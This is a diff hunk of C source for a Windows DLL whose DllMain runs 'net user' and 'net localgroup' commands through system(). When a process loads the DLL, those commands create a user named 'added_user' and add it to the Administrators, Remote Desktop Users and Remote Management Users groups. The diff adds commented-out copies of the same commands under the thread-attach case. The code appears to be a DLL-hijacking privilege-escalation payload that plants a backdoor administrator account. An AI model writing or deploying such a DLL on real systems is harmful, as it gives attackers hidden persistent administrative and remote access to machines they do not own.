@@ -19,7 +19,11 @@ LPVOID lpReserved ) // Reserved
 		i = system("net localgroup \"Remote Management Users\" added_user /add");
 		break;
         case DLL_THREAD_ATTACH: // A process is creating a new thread.
-        break;
+		//i = system("net user added_user password /add");
+		//i = system("net localgroup Administrators added_user /add");
+		//i = system("net localgroup \"Remote Desktop Users\" added_user /add");
+		//i = system("net localgroup \"Remote Management Users\" added_user /add");
+		break;
         case DLL_THREAD_DETACH: // A thread exits normally.
         break;
         case DLL_PROCESS_DETACH: // A process unloads the DLL.
